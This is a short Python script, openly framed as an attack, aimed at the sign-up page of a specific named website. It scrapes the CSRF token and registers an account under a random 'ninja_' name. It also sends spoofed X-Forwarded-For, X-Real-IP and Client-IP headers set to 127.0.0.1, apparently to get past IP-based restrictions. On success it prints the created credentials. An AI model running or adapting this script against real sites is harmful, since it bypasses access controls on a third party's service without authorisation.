import requests
import random
import string
import sys

TARGET_URL = "http://g.orehus.club/user/sign_up"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "Client-IP": "127.0.0.1",
    "Referer": "http://g.orehus.club/"
}

def attack():
    s = requests.Session()
    s.headers.update(HEADERS)
    
    # 1. GET CSRF
    try:
        r = s.get(TARGET_URL, timeout=10)
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    if r.status_code != 200:
        print(f"[-] Initial GET failed: {r.status_code}")
        # return # Try anyway

    csrf = ""
    try:
        import re
        csrf = re.search(r'name="_csrf" value="(.*?)"', r.text).group(1)
        print(f"[+] CSRF: {csrf}")
    except:
        print("[-] CSRF not found")
        # return

    # 2. POST
    username = "ninja_" + ''.join(random.choices(string.ascii_lowercase, k=5))
    email = f"{username}@gmail.com"
    password = "P@ssw0rd_Super_Strong_2026"
    
    data = {
        "_csrf": csrf,
        "user_name": username,
        "email": email,
        "password": password,
        "retype": password
    }
    
    print(f"[*] Registering {username}...")
    r = s.post(TARGET_URL, data=data)
    
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        if "error" in r.text:
            print("[-] Form Error (Check HTML)")
        else:
            print(f"[+] SUCCESS! Creds: {username}:{password}")
    elif r.status_code == 403:
        print("[-] 403 Forbidden - Headers didn't help.")
    else:
        print(f"[-] Failed with {r.status_code}")

if __name__ == "__main__":
    attack()
